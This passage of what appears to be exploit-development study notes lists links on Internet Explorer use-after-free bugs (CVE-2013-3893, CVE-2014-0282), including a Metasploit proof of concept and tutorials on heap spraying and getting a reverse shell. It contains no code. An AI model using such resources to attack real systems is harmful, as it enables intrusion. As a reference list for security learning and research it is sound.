- [Analysis by ricew4ng](https://github.com/ricew4ng/BrowserSecurity/blob/master/CVE-2013-3893_IE_UAF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2013-3893_IE_UAF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md)

- [Metasploit PoC on exploitdb](https://www.exploit-db.com/exploits/49872)

### CVE-2014-0282 IE CInput

Did not do any RCA/exploit analysis, just focused on controlling EIP via the UaF vulnerability.

# Browser-related/Heap Spray + UaF References

[fuzzysecurity tutorial](https://fuzzysecurity.com/tutorials/expDev/11.html)

[webstersprodigy tutorial](https://webstersprodigy.net/2014/11/19/use-after-free-exploits-for-humans-part-1-exploiting-ms13-080-on-ie8-winxpsp3/)

[connormcgarr tutorial](https://connormcgarr.github.io/browser1/)

[sktechy chinese blog tutorial](https://blog.csdn.net/qs_hud/article/details/9821735)

[how to heap spray and get a reverse shell](https://rstforums.com/forum/topic/103900-rop-heap-spray-for-a-reverse-shell-in-ie8/)